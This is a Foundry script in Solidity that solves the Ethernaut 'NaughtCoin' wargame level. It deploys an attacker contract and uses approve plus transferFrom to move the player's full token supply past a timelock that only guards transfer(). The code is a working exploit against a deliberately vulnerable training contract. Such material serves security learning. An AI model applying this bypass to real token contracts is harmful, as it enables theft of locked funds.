// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/NaughtCoin.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackerContract {
    NaughtCoin public naughtCoinInstance;

    constructor (address _address) {
        naughtCoinInstance = NaughtCoin(_address);
    }

    function attack() public {
        naughtCoinInstance.transferFrom(0x709885C74934cC931562540A863A5659eb7Cbd49, address(this), naughtCoinInstance.INITIAL_SUPPLY());
    }
}

contract NaughtCoinSolution is Script {
    NaughtCoin public naughtCoinInstance = NaughtCoin(0x0156a2dC26e3c62dBf4f8a7abef0B42b8Cf56d56);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Before Contract INITIAL_SUPPLY : ", naughtCoinInstance.INITIAL_SUPPLY());
        console.log("Player Balance : ", naughtCoinInstance.balanceOf(vm.envAddress("MY_ADDRESS")));
        console.log("Before Contract player : ", naughtCoinInstance.player());

        AttackerContract attackerContract = new AttackerContract(address(naughtCoinInstance));

        naughtCoinInstance.approve(address(attackerContract), naughtCoinInstance.INITIAL_SUPPLY());

        attackerContract.attack();

        console.log("After Contract INITIAL_SUPPLY : ", naughtCoinInstance.INITIAL_SUPPLY());
        console.log("After Balance : ", naughtCoinInstance.balanceOf(vm.envAddress("MY_ADDRESS")));

        vm.stopBroadcast();
    }
}